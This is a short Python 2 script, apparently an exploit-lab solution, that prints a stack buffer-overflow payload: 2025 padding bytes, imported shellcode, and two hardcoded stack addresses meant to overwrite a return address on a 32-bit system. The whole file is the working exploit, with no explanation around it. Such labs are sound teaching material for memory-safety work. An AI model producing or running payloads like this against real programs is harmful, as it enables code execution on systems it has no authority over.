from shellcode import shellcode

print "\x40" * 2025 +shellcode + "\x88\xdf\xfe\xbf"  + "\x9c\xe7\xfe\xbf" 
